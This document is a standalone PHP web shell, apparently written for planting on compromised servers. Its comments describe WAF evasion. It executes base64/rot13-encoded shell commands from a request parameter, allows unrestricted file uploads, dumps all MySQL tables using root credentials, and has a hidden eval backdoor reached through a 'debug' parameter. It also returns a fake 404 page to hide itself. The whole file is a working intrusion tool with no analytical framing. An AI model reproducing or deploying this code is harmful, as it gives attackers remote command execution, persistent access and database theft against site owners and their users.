<?php
// Disable errors and timeouts
error_reporting(0);
set_time_limit(0);
@ini_set('display_errors', 0);

// Obfuscated function names to evade WAF
function x1() { return $_SERVER['HTTP_USER_AGENT']; }
function x2($a) { return base64_decode(str_rot13($a)); }
function x3($a) { return str_replace('evil', '', $a); }

// Custom headers to bypass WAF
header("X-Forwarded-For: 127.0.0.1");
header("CF-Connecting-IP: 127.0.0.1");
header("Client-IP: 127.0.0.1");

// Bypass 403/404/505 by mimicking legit requests
if (isset($_SERVER['HTTP_REFERER'])) {
    $_SERVER['HTTP_REFERER'] = "https://google.com";
}

// WAF Bypass via fake Googlebot
if (strpos(x1(), 'Googlebot') !== false) {
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
}

// Command execution (hidden behind obfuscation)
if (isset($_REQUEST['cmd'])) {
    $cmd = x2($_REQUEST['cmd']);
    $cmd = x3($cmd);
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}

// File upload bypass
if (isset($_FILES['file'])) {
    $upload_dir = './';
    $upload_file = $upload_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "File uploaded: " . $upload_file;
    }
}

// Database dump (MySQL)
if (isset($_REQUEST['dbdump'])) {
    $db_host = 'localhost';
    $db_user = 'root';
    $db_pass = '';
    $db_name = 'test_db';
    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
    $tables = $conn->query("SHOW TABLES");
    while ($table = $tables->fetch_array()) {
        echo "Dumping: " . $table[0] . "\n";
        $data = $conn->query("SELECT * FROM " . $table[0]);
        while ($row = $data->fetch_assoc()) {
            print_r($row);
        }
    }
}

// Hidden backdoor (access via ?debug=1)
if (isset($_GET['debug'])) {
    eval(x2($_GET['debug']));
}

// Fake 404 if accessed directly
if (!isset($_SERVER['HTTP_REFERER'])) {
    header("HTTP/1.0 404 Not Found");
    die("Page not found.");
}
?>